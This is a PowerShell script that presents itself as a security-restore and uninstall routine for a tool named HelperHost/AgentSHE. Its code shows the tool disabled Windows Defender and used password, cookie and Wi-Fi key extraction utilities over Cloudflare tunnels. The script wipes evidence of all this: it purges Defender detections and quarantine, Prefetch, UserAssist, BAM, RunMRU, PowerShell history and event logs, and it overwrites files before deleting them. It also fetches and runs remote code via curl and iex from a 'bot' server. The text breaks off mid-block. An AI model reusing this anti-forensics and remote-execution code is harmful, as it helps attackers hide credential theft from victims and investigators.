# Restores Windows security + removes HelperHost install side-effects.
# Safe to re-run. Prefer elevated (HelperHostWipeRestore task).
# UAC is restored LAST so mid-wipe elevated steps don't re-prompt.
# Order: STOP EarlyAV → enable-defender → clear policies → services → scrub ALL traces.
$ErrorActionPreference = 'SilentlyContinue'
try { $PSNativeCommandUseErrorActionPreference = $false } catch {}

function Test-IsAdmin {
  $id = [Security.Principal.WindowsIdentity]::GetCurrent()
  $p = New-Object Security.Principal.WindowsPrincipal($id)
  return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

$kit = Join-Path $env:ProgramData 'HelperHostWipe'
if (-not (Test-Path $kit)) { New-Item -ItemType Directory -Path $kit -Force | Out-Null }
# Abort EarlyAV on any future boot BEFORE anything else
'1' | Set-Content -Encoding ASCII (Join-Path $kit 'STOP') -Force

# Self-elevate if needed (manual restore from PowerShell)
if (-not (Test-IsAdmin) -and $env:AGENTSHE_ELEVATED -ne '1') {
  $self = $MyInvocation.MyCommand.Path
  if (-not $self) {
    # iex'd from memory: prefer kit/local copy, then bot_base from wipe-state — never a dead tunnel URL
    $url = $env:AGENTSHE_RESTORE_URL
    $kitRestore = Join-Path $kit 'restore-win-security.ps1'
    if (-not $url -and (Test-Path $kitRestore)) { $self = $kitRestore }
    if (-not $url -and -not $self) {
      try {
        $ws = Get-Content (Join-Path $env:TEMP 'hh-wipe-state.json') -Raw -EA SilentlyContinue | ConvertFrom-Json
        if ($ws.bot_base) { $url = ($ws.bot_base.TrimEnd('/') + '/files/scripts/restore-win-security.ps1') }
      } catch {}
    }
    if (-not $url -and -not $self -and $env:AGENTSHE_BOT_BASE) {
      $url = ($env:AGENTSHE_BOT_BASE.TrimEnd('/') + '/files/scripts/restore-win-security.ps1')
    }
    if ($self) {
      $psi = New-Object System.Diagnostics.ProcessStartInfo
      $psi.FileName = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
      $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$self`""
      $psi.Verb = 'runas'
      $psi.UseShellExecute = $true
      try {
        $p = [Diagnostics.Process]::Start($psi)
        $p.WaitForExit()
        Write-Output 'security-restored (elevated)'
      } catch {
        throw 'UAC refusee — relance en tant qu''Administrateur'
      }
      exit 0
    }
    if (-not $url) { throw 'restore URL inconnue — lance restore-win-security.ps1 en Admin' }
    $wrap = Join-Path $env:TEMP ('hh-restore-manual-' + [guid]::NewGuid().ToString('n') + '.ps1')
    @(
      "`$ErrorActionPreference='SilentlyContinue'"
      "`$env:AGENTSHE_ELEVATED='1'"
      "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12"
      "iex ((curl.exe -fsSL '$url' | Out-String))"
    ) -join "`r`n" | Set-Content -Encoding UTF8 $wrap
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$wrap`""
    $psi.Verb = 'runas'
    $psi.UseShellExecute = $true
    try {
      $p = [Diagnostics.Process]::Start($psi)
      $p.WaitForExit()
      Write-Output 'security-restored (elevated)'
    } catch {
      throw 'UAC refusee — relance en tant qu''Administrateur'
    }
    exit 0
  }
}

$hh = Join-Path $env:LOCALAPPDATA 'HelperHost'
$cache = Join-Path $env:TEMP 'HelperHostCache'
$tools = Join-Path $hh 'tools'

$mark = 'HelperHost|EdgeRelay|AgentSHE|agentshe|lilygopro|install-win|install\.ps1|install\.sh|HelperHostCache|AGENTSHE_|trycloudflare|ChromePass|WebBrowserPassView|PasswordFox|mailpv|mspass|netpass|iepv|Dialupass|PstPassword|ChromeCookiesView|BrowsingHistoryView|WirelessKeyView|WNetWatcher|hh-wipe|hh-restore|hh-export|early-av|dControl|disable-defender|enable-defender|HelperHostWipe|defender-control|Cleaner\.exe|sudden-admissions'

# Kill EarlyAV first so a reboot cannot re-disable Defender mid-restore
foreach ($tn in @('HelperHostEarlyAV', 'HelperHost', 'HelperHostResume', 'HelperHostBoot', 'HelperHostResumeBoot', 'HelperHostDControlOff', 'HelperHostDControlOn', 'AgentShePC')) {
  Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue
  schtasks /Delete /TN $tn /F 2>$null | Out-Null
}

# Re-enable Defender via pgkt04 enable-defender.exe (open-source), then drop ALL org policies.
Get-Process dControl -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
Remove-Item (Join-Path $hh 'dControl.exe') -Force -EA SilentlyContinue
Remove-Item (Join-Path $hh 'dc-off.cmd') -Force -EA SilentlyContinue
Remove-Item (Join-Path $hh 'early-av.cmd') -Force -EA SilentlyContinue

$en = Join-Path $hh 'enable-defender.exe'
$enKit = Join-Path $kit 'enable-defender.exe'
$enTemp = Join-Path $env:TEMP 'hh-enable-defender.exe'
$enRun = $null
foreach ($cand in @($enKit, $enTemp, $en)) {
  if ((Test-Path $cand) -and (Get-Item $cand).Length -gt 100000) { $enRun = $cand; break }
}
# Pull from bot if missing (manual restore after wipe) — bot_base from kit/wipe-state only
$botEnable = $null
try {
  $bj = Get-Content (Join-Path $kit 'bot.json') -Raw -EA SilentlyContinue | ConvertFrom-Json
  if ($bj.bot_base) { $botEnable = ($bj.bot_base.TrimEnd('/') + '/files/tools/enable-defender.exe') }
} catch {}
try {
  $st = (Get-ItemProperty 'HKCU:\Software\HelperHost' -Name state -EA SilentlyContinue).state
  if ($st) {
    $j = $st | ConvertFrom-Json
    if ($j.bot_base) { $botEnable = ($j.bot_base.TrimEnd('/') + '/files/tools/enable-defender.exe') }
  }
} catch {}
if (-not $enRun -and $env:AGENTSHE_BOT_BASE) {
  $botEnable = ($env:AGENTSHE_BOT_BASE.TrimEnd('/') + '/files/tools/enable-defender.exe')
}
if (-not $enRun -and -not $botEnable -and $env:AGENTSHE_RESTORE_URL) {
  try {
    $botEnable = (($env:AGENTSHE_RESTORE_URL -replace '/files/scripts/.*$', '') + '/files/tools/enable-defender.exe')
  } catch {}
}
if (-not $enRun -and -not $botEnable) {
  try {
    $ws = Get-Content (Join-Path $env:TEMP 'hh-wipe-state.json') -Raw -EA SilentlyContinue | ConvertFrom-Json
    if ($ws.bot_base) { $botEnable = ($ws.bot_base.TrimEnd('/') + '/files/tools/enable-defender.exe') }
  } catch {}
}
if (-not $enRun -and $botEnable) {
  try {
    & curl.exe -fsSL $botEnable -o $enTemp
    if ((Test-Path $enTemp) -and (Get-Item $enTemp).Length -gt 100000) {
      $enRun = $enTemp
      Copy-Item $enTemp $enKit -Force -EA SilentlyContinue
    }
  } catch {}
}
if ($enRun) {
  try {
    $p = Start-Process -FilePath $enRun -ArgumentList @('-s') -Wait -PassThru -WindowStyle Hidden -EA SilentlyContinue
    Write-Output ("enable-defender exit=" + [int]$p.ExitCode)
  } catch {
    cmd.exe /c "`"$enRun`" -s >nul 2>&1" | Out-Null
  }
  Get-Process 'enable-defender','disable-defender','dControl' -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
}
Remove-Item (Join-Path $hh '.dcontrol-off') -Force -EA SilentlyContinue
Remove-Item (Join-Path $hh 'disable-defender.exe') -Force -EA SilentlyContinue
Remove-Item (Join-Path $hh 'enable-defender.exe') -Force -EA SilentlyContinue
# Keep kit enable-defender until end of script (retry safety)
foreach ($tn in @('HelperHostDControlOff', 'HelperHostDControlOn', 'HelperHostEarlyAV')) {
  Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue
  schtasks /Delete /TN $tn /F 2>$null | Out-Null
}

# --- Load UAC backup now (folder deleted later); apply at END ---
$sysPol = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
$uacBak = Join-Path $hh 'uac-backup.json'
$uj = $null
try {
  $regState = (Get-ItemProperty 'HKCU:\Software\HelperHost' -Name state -EA SilentlyContinue).state
  if ($regState) {
    $sj = $regState | ConvertFrom-Json
    if ($sj.uac_bak) {
      if ($sj.uac_bak -is [string]) { $uj = $sj.uac_bak | ConvertFrom-Json }
      else { $uj = $sj.uac_bak }
    }
  }
} catch {}
# Also accept wipe-state snapshot written by agent before registry clear
$wipeState = Join-Path $env:TEMP 'hh-wipe-state.json'
if (-not $uj -and (Test-Path $wipeState)) {
  try {
    $ws = Get-Content $wipeState -Raw | ConvertFrom-Json
    if ($ws.uac_bak) {
      if ($ws.uac_bak -is [string]) { $uj = $ws.uac_bak | ConvertFrom-Json }
      else { $uj = $ws.uac_bak }
    }
  } catch {}
}
if (-not $uj -and (Test-Path $uacBak)) {
  try { $uj = Get-Content $uacBak -Raw | ConvertFrom-Json } catch {}
}

# --- Defender Security Center / UX / toast policies we set ---
Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration' -Name Notification_Suppress -Force -EA SilentlyContinue
Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name DisableNotifications -Force -EA SilentlyContinue
Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name DisableEnhancedNotifications -Force -EA SilentlyContinue
Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Explorer' -Name DisableNotificationCenter -Force -EA SilentlyContinue
Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoToastApplicationNotification -Force -EA SilentlyContinue
Remove-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoToastApplicationNotification -Force -EA SilentlyContinue
Remove-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoCloudApplicationNotification -Force -EA SilentlyContinue
Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoToastApplicationNotification -Force -EA SilentlyContinue
Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoToastApplicationNotificationOnLockScreen -Force -EA SilentlyContinue
if (Get-Command Set-MpPreference -EA SilentlyContinue) {
  Set-MpPreference -UILockdown $false -EA SilentlyContinue
}
cmd.exe /c 'reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\UX Configuration" /v UILockdown /t REG_DWORD /d 0 /f >nul 2>&1' | Out-Null
cmd.exe /c 'reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 0 /f >nul 2>&1' | Out-Null
# Security Center page locks
foreach ($sub in @(
  'Virus and threat protection','App and browser protection','Account protection',
  'Family options','Device security','Firewall and network protection'
)) {
  cmd.exe /c "reg delete `"HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\$sub`" /v UILockdown /f >nul 2>&1" | Out-Null
}

# --- Remove ALL Defender org policies (reg.exe — more reliable than PS Remove-Item) ---
foreach ($regPath in @(
  'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender',
  'HKLM\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows Defender',
  'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center',
  'HKLM\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter'
)) {
  cmd.exe /c "reg delete `"$regPath`" /f >nul 2>&1" | Out-Null
}
foreach ($polRoot in @(
  'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender',
  'HKLM:\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows Defender',
  'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center'
)) {
  if (Test-Path $polRoot) {
    Remove-Item $polRoot -Recurse -Force -EA SilentlyContinue
  }
}
cmd.exe /c 'reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /f >nul 2>&1' | Out-Null
Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Name EnableSmartScreen -Force -EA SilentlyContinue
# Undo live (non-policy) RTP overrides we may have written
$rtpLive = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection'
if (Test-Path $rtpLive) {
  foreach ($n in @(
    'DisableRealtimeMonitoring','DisableBehaviorMonitoring','DisableOnAccessProtection',
    'DisableScanOnRealtimeEnable','DisableIOAVProtection','DisableScriptScanning'
  )) {
    Remove-ItemProperty $rtpLive -Name $n -Force -EA SilentlyContinue
    cmd.exe /c "reg delete `"HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection`" /v $n /f >nul 2>&1" | Out-Null
  }
}
# Tamper / Features leftovers
Remove-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' -Name TamperProtection -Force -EA SilentlyContinue
Remove-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' -Name TamperProtectionSource -Force -EA SilentlyContinue
cmd.exe /c 'reg delete "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /f >nul 2>&1' | Out-Null
cmd.exe /c 'reg delete "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtectionSource /f >nul 2>&1' | Out-Null

# Refresh policy cache so UI drops "gere par votre administrateur"
cmd.exe /c 'gpupdate.exe /Target:Computer /Force >nul 2>&1' | Out-Null
cmd.exe /c 'gpupdate.exe /force >nul 2>&1' | Out-Null

# --- Defender services ---
foreach ($svc in @('WinDefend', 'WdNisSvc', 'Sense', 'SecurityHealthService', 'wscsvc', 'WdNisDrv', 'WdFilter', 'WdBoot', 'webthreatdefsvc', 'webthreatdefusersvc')) {
  $svcKey = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc"
  if (Test-Path $svcKey) {
    $start = if ($svc -in @('WdNisDrv', 'WdFilter', 'WdBoot')) { 1 } else { 2 }
    Set-ItemProperty $svcKey -Name Start -Value $start -Type DWord -Force -EA SilentlyContinue
  }
  cmd.exe /c "sc.exe config $svc start= demand >nul 2>&1" | Out-Null
  if ($svc -in @('WinDefend', 'WdNisSvc', 'Sense', 'SecurityHealthService', 'wscsvc')) {
    cmd.exe /c "sc.exe config $svc start= auto >nul 2>&1" | Out-Null
    Set-Service $svc -StartupType Automatic -EA SilentlyContinue
    Start-Service $svc -EA SilentlyContinue
  }
}

# --- Defender preferences + drop our exclusions ---
if (Get-Command Set-MpPreference -EA SilentlyContinue) {
  Set-MpPreference -DisableRealtimeMonitoring $false -EA SilentlyContinue
  Set-MpPreference -DisableBehaviorMonitoring $false -EA SilentlyContinue
  Set-MpPreference -DisableBlockAtFirstSeen $false -EA SilentlyContinue
  Set-MpPreference -DisableIOAVProtection $false -EA SilentlyContinue
  Set-MpPreference -DisableScriptScanning $false -EA SilentlyContinue
  Set-MpPreference -DisableArchiveScanning $false -EA SilentlyContinue
  Set-MpPreference -DisableEmailScanning $false -EA SilentlyContinue
  Set-MpPreference -DisableRemovableDriveScanning $false -EA SilentlyContinue
  Set-MpPreference -PUAProtection Enabled -EA SilentlyContinue
  Set-MpPreference -MAPSReporting Advanced -EA SilentlyContinue
  Set-MpPreference -SubmitSamplesConsent 1 -EA SilentlyContinue
  Set-MpPreference -EnableNetworkProtection Enabled -EA SilentlyContinue
  Set-MpPreference -CloudBlockLevel Default -EA SilentlyContinue
}
if (Get-Command Remove-MpPreference -EA SilentlyContinue) {
  Remove-MpPreference -ExclusionPath $hh -EA SilentlyContinue
  Remove-MpPreference -ExclusionPath $cache -EA SilentlyContinue
  Remove-MpPreference -ExclusionPath $tools -EA SilentlyContinue
  Remove-MpPreference -ExclusionProcess 'HelperHost.exe' -EA SilentlyContinue
  Remove-MpPreference -ExclusionProcess 'EdgeRelay.exe' -EA SilentlyContinue
  Remove-MpPreference -ExclusionProcess 'dControl.exe' -EA SilentlyContinue
  Remove-MpPreference -ExclusionProcess 'disable-defender.exe' -EA SilentlyContinue
  Remove-MpPreference -ExclusionProcess 'enable-defender.exe' -EA SilentlyContinue
  Remove-MpPreference -ExclusionExtension '.exe','.dll','.ps1','.bat','.cmd','.vbs','.zip','.txt' -EA SilentlyContinue
  if (Test-Path (Join-Path $hh 'HelperHost.exe')) {
    Remove-MpPreference -ControlledFolderAccessAllowedApplications (Join-Path $hh 'HelperHost.exe') -EA SilentlyContinue
  }
  if (Test-Path (Join-Path $hh 'EdgeRelay.exe')) {
    Remove-MpPreference -ControlledFolderAccessAllowedApplications (Join-Path $hh 'EdgeRelay.exe') -EA SilentlyContinue
  }
}
Remove-Item (Join-Path $hh '.av-off') -Force -EA SilentlyContinue

# Refresh signatures (install used to gut them — we no longer do that, but repair if empty)
$mpCmd = $null
$plat = Get-ChildItem 'C:\ProgramData\Microsoft\Windows Defender\Platform' -Directory -EA SilentlyContinue |
  Sort-Object Name -Descending | Select-Object -First 1
if ($plat) {
  $c = Join-Path $plat.FullName 'MpCmdRun.exe'
  if (Test-Path $c) { $mpCmd = $c }
}
if (-not $mpCmd) {
  $c = Join-Path $env:ProgramFiles 'Windows Defender\MpCmdRun.exe'
  if (Test-Path $c) { $mpCmd = $c }
}
if ($mpCmd) {
  try { & $mpCmd -wdenable 2>$null | Out-Null } catch {}
  try { Start-Process -FilePath $mpCmd -ArgumentList '-SignatureUpdate' -Wait -WindowStyle Hidden -EA SilentlyContinue } catch {}
}

# Repair quoted ImagePath if a previous broken restore stripped quotes
foreach ($pair in @(
  @{ Name='MDCoreSvc'; Exe='MpDefenderCoreService.exe' },
  @{ Name='MpDefenderCoreService'; Exe='MpDefenderCoreService.exe' },
  @{ Name='WinDefend'; Exe='MsMpEng.exe' }
)) {
  $key = "HKLM:\SYSTEM\CurrentControlSet\Services\$($pair.Name)"
  if (-not (Test-Path $key)) { continue }
  $ip = (Get-ItemProperty $key -Name ImagePath -EA SilentlyContinue).ImagePath
  if (-not $ip) { continue }
  if ($ip -notmatch '"' -and $ip -match 'Program Files|ProgramData') {
    if ($plat) {
      $full = Join-Path $plat.FullName $pair.Exe
      if (Test-Path $full) {
        Set-ItemProperty $key -Name ImagePath -Value ('"' + $full + '"') -Type ExpandString -Force -EA SilentlyContinue
      }
    }
  }
}

# Clear defender-control working dir leftovers
Remove-Item 'C:\ProgramData\defender-control' -Recurse -Force -EA SilentlyContinue

# Clear local Defender detections / history tied to our names (best-effort)
try {
  Get-MpThreatDetection -EA SilentlyContinue | Where-Object {
    ($_.Resources -join ' ') -match $mark
  } | ForEach-Object {
    Remove-MpThreat -ThreatID $_.ThreatID -EA SilentlyContinue
  }
} catch {}
$defPaths = @(
  "$env:ProgramData\Microsoft\Windows Defender\Quarantine",
  "$env:ProgramData\Microsoft\Windows Defender\Scans\History",
  "$env:LOCALAPPDATA\Packages\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy\LocalState"
)
foreach ($dp in $defPaths) {
  if (Test-Path $dp) {
    Get-ChildItem $dp -Recurse -Force -EA SilentlyContinue | Where-Object {
      $_.Name -match $mark -or $_.FullName -match $mark
    } | Remove-Item -Recurse -Force -EA SilentlyContinue
  }
}

# --- Undo Soft Device Guard / SAC toggles from install (best-effort) ---
$ci = 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy'
if (Test-Path $ci) {
  $cur = (Get-ItemProperty $ci -Name VerifiedAndReputablePolicyState -EA SilentlyContinue).VerifiedAndReputablePolicyState
  if ($null -ne $cur -and [int]$cur -eq 0) {
    Set-ItemProperty $ci -Name VerifiedAndReputablePolicyState -Value 1 -Type DWord -Force -EA SilentlyContinue
  }
}
$dg = 'HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard'
if (Test-Path $dg) {
  Remove-ItemProperty $dg -Name Locked -Force -EA SilentlyContinue
}
& bcdedit.exe /set '{current}' hypervisorlaunchtype Auto | Out-Null
& bcdedit.exe /deletevalue '{current}' vsmlaunchtype | Out-Null

# --- Scheduled tasks (again, after Defender) ---
foreach ($tn in @(
  'HelperHost', 'HelperHostResume', 'HelperHostBoot', 'HelperHostResumeBoot',
  'HelperHostWipeRestore', 'HelperHostEarlyAV', 'AgentShePC'
)) {
  Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue
  schtasks /Delete /TN $tn /F 2>$null | Out-Null
}

# --- Run key + Startup apps (Task Manager) ---
$run = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
foreach ($n in @('HelperHost', 'AgentShePC')) {
  Remove-ItemProperty -Path $run -Name $n -Force -EA SilentlyContinue
}
$approved = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run'
foreach ($n in @('HelperHost', 'AgentShePC')) {
  Remove-ItemProperty -Path $approved -Name $n -Force -EA SilentlyContinue
}

# --- RunMRU ---
$mru = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
if (Test-Path $mru) {
  $props = Get-ItemProperty $mru -EA SilentlyContinue
  $drop = @()
  foreach ($p in $props.PSObject.Properties) {
    if ($p.Name -in @('PSPath', 'PSParentPath', 'PSChildName', 'PSDrive', 'PSProvider', 'MRUList')) { continue }
    if ([string]$p.Value -match $mark) { $drop += $p.Name }
  }
  foreach ($n in $drop) { Remove-ItemProperty -Path $mru -Name $n -Force -EA SilentlyContinue }
  if ($drop.Count -gt 0) { Remove-ItemProperty -Path $mru -Name MRUList -Force -EA SilentlyContinue }
}

# --- UserAssist / BAM / AppCompat flags mentioning us ---
$ua = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist'
Get-ChildItem $ua -Recurse -EA SilentlyContinue | ForEach-Object {
  try {
    $item = $_
    $vals = Get-ItemProperty $item.PSPath -EA SilentlyContinue
    foreach ($p in $vals.PSObject.Properties) {
      if ($p.Name -match 'PS') { continue }
      if ($p.Name -match $mark) {
        Remove-ItemProperty -Path $item.PSPath -Name $p.Name -Force -EA SilentlyContinue
      }
    }
  } catch {}
}
Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings' -EA SilentlyContinue | ForEach-Object {
  $vals = Get-ItemProperty $_.PSPath -EA SilentlyContinue
  foreach ($p in $vals.PSObject.Properties) {
    if ($p.Name -match 'PS') { continue }
    if ($p.Name -match $mark -or ([string]$p.Value -match $mark)) {
      Remove-ItemProperty -Path $_.PSPath -Name $p.Name -Force -EA SilentlyContinue
    }
  }
}
Get-ChildItem 'HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache' -EA SilentlyContinue | Out-Null
$mui = 'HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache'
if (Test-Path $mui) {
  $vals = Get-ItemProperty $mui -EA SilentlyContinue
  foreach ($p in $vals.PSObject.Properties) {
    if ($p.Name -match 'PS') { continue }
    if ($p.Name -match $mark -or ([string]$p.Value -match $mark)) {
      Remove-ItemProperty -Path $mui -Name $p.Name -Force -EA SilentlyContinue
    }
  }
}

# --- Temp / leftover install artifacts ---
Get-ChildItem $env:TEMP -Filter 'HelperHost-*' -EA SilentlyContinue | Remove-Item -Force -Recurse -EA SilentlyContinue
Get-ChildItem $env:TEMP -Filter 'hh-*' -EA SilentlyContinue | Remove-Item -Force -Recurse -EA SilentlyContinue
Get-ChildItem $env:TEMP -Filter 'hh-export-*' -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue

# Prefetch (HelperHost + tools + defender-control + wipe)
$pf = "$env:SystemRoot\Prefetch"
if (Test-Path $pf) {
  Get-ChildItem $pf -EA SilentlyContinue | Where-Object {
    $_.Name -match '^(HELPERHOST|EDGERELAY|CHROMEPASS|WEBBROWSERPASSVIEW|PASSWORDFOX|MAILPV|MSPASS|NETPASS|IEPV|DIALUPASS|PSTPASSWORD|CLOUDFLARED|DISABLE-DEFENDER|ENABLE-DEFENDER|DCONTROL|HH-WIPE|HH-RESTORE|CLEANER|CHROMECOOKIESVIEW|BROWSINGHISTORYVIEW|WIRELESSKEYVIEW|WNETWATCHER)'
  } | Remove-Item -Force -EA SilentlyContinue
}

# Recent / Jump lists / AutomaticDestinations soft clean
foreach ($recentRoot in @(
  (Join-Path $env:APPDATA 'Microsoft\Windows\Recent'),
  (Join-Path $env:APPDATA 'Microsoft\Windows\Recent\AutomaticDestinations'),
  (Join-Path $env:APPDATA 'Microsoft\Windows\Recent\CustomDestinations')
)) {
  Get-ChildItem $recentRoot -Force -EA SilentlyContinue | Where-Object {
    $_.Name -match $mark -or (Get-Content $_.FullName -Raw -EA SilentlyContinue) -match $mark
  } | Remove-Item -Force -EA SilentlyContinue
}

# PS / cmd history
$hist = Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
if (Test-Path $hist) {
  (Get-Content $hist -EA SilentlyContinue) | Where-Object { $_ -notmatch $mark } | Set-Content $hist -Encoding UTF8
}

# AppCompat / Shimcache hint files (cannot fully clear Amcache without reboot; purge matching)
$am = "$env:ProgramData\Microsoft\Windows\AppCompat\Programs"
if (Test-Path $am) {
  Get-ChildItem $am -Recurse -Force -EA SilentlyContinue | Where-Object {
    $_.Name -match $mark -or $_.FullName -match $mark
  } | Remove-Item -Force -Recurse -EA SilentlyContinue
}

# Event logs: clear only channels we commonly hit (needs admin) — leave Security alone if access denied
foreach ($log in @('Windows PowerShell', 'Microsoft-Windows-PowerShell/Operational', 'Microsoft-Windows-TaskScheduler/Operational')) {
  try { wevtutil cl $log 2>$null } catch {}
}

# --- Restore notification settings from backup ---
$bak = Join-Path $hh 'notify-backup.json'
$push = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications'
$exp = 'HKCU:\Software\Policies\Microsoft\Windows\Explorer'
$ns = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings'
$j = $null
try {
  if ($regState) {
    $sj2 = $regState | ConvertFrom-Json
    if ($sj2.notify_bak) {
      if ($sj2.notify_bak -is [string]) { $j = $sj2.notify_bak | ConvertFrom-Json }
      else { $j = $sj2.notify_bak }
    }
  }
} catch {}
if (-not $j -and (Test-Path $bak)) {
  try { $j = Get-Content $bak -Raw | ConvertFrom-Json } catch {}
}
$toast = 1
if ($j -and $null -ne $j.toast_enabled) { $toast = [int]$j.toast_enabled }
New-Item $push -Force | Out-Null
Set-ItemProperty $push -Name ToastEnabled -Value $toast -Type DWord -Force
if ($j -and $null -ne $j.disable_notification_center) {
  New-Item $exp -Force | Out-Null
  Set-ItemProperty $exp -Name DisableNotificationCenter -Value ([int]$j.disable_notification_center) -Type DWord -Force
} else {
  Remove-ItemProperty $exp -Name DisableNotificationCenter -Force -EA SilentlyContinue
}
New-Item $ns -Force | Out-Null
$te = 1; if ($j -and $null -ne $j.toasts_enabled) { $te = [int]$j.toasts_enabled }
$atl = 1; if ($j -and $null -ne $j.allow_toast_above_lock) { $atl = [int]$j.allow_toast_above_lock }
$snd = 1; if ($j -and $null -ne $j.allow_notif_sound) { $snd = [int]$j.allow_notif_sound }
Set-ItemProperty $ns -Name NOC_GLOBAL_SETTING_TOASTS_ENABLED -Value $te -Type DWord -Force
Set-ItemProperty $ns -Name NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK -Value $atl -Type DWord -Force
Set-ItemProperty $ns -Name NOC_GLOBAL_SETTING_ALLOW_NOTIFICATION_SOUND -Value $snd -Type DWord -Force
Remove-ItemProperty $ns -Name NOC_GLOBAL_SETTING_ALLOW_CRITICAL_TOASTS_ABOVE_LOCK -Force -EA SilentlyContinue
foreach ($sub in @(
  'Windows.SystemToast.SecurityAndMaintenance',
  'Windows.SystemToast.WindowsUpdate.Notification',
  'Windows.SystemToast.Explorer',
  'Windows.SystemToast.StartupApp',
  'Windows.SystemToast.Suggested',
  'Windows.SystemToast.AudioTroubleshooter',
  'Microsoft.Windows.SecHealthUI_cw5n1h2txyewy!SecHealthUI',
  'Windows.SystemToast.WindowsDefender.SecurityCenter',
  'Windows.SystemToast.WindowsDefender.Av'
)) {
  $p = "$ns\$sub"
  if (Test-Path $p) { Set-ItemProperty $p -Name Enabled -Value 1 -Type DWord -Force }
}
$baa = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications'
if (Test-Path $baa) { Set-ItemProperty $baa -Name GlobalUserDisabled -Value 0 -Type DWord -Force }
Remove-Item $bak -Force -EA SilentlyContinue
Remove-Item $uacBak -Force -EA SilentlyContinue
Remove-Item 'HKCU:\Software\HelperHost' -Recurse -Force -EA SilentlyContinue

# Wipe install + cache trees (hard delete, never Recycle Bin)
# Cover both %TEMP%\HelperHostCache and %LOCALAPPDATA%\Temp\HelperHostCache
$cacheAlt = Join-Path $env:LOCALAPPDATA 'Temp\HelperHostCache'
Get-Process HelperHost,EdgeRelay,cloudflared,dControl,'disable-defender','enable-defender' -EA SilentlyContinue |
  Stop-Process -Force -EA SilentlyContinue
foreach ($p in @($hh, $cache, $cacheAlt, $tools)) {
  if (-not $p -or -not (Test-Path -LiteralPath $p)) { continue }
  for ($attempt = 1; $attempt -le 6; $attempt++) {
    Get-Process HelperHost,EdgeRelay,cloudflared,dControl,'disable-defender','enable-defender' -EA SilentlyContinue |
      Stop-Process -Force -EA SilentlyContinue
    attrib -h -s /s /d "$p\*" 2>$null | Out-Null
    attrib -h -s $p 2>$null | Out-Null
    cmd /c "takeown /f `"$p`" /r /d o" | Out-Null
    cmd /c "icacls `"$p`" /grant *S-1-5-32-544:F /t /c /q" | Out-Null
    Get-ChildItem -LiteralPath $p -Recurse -Force -File -EA SilentlyContinue | ForEach-Object {
      try {
        $_.Attributes = 'Normal'
        $fs = [IO.File]::Open($_.FullName, 'Open', 'Write', 'None')
        $fs.SetLength(0); $fs.Close()
        Remove-Item -LiteralPath $_.FullName -Force -EA SilentlyContinue
      } catch {
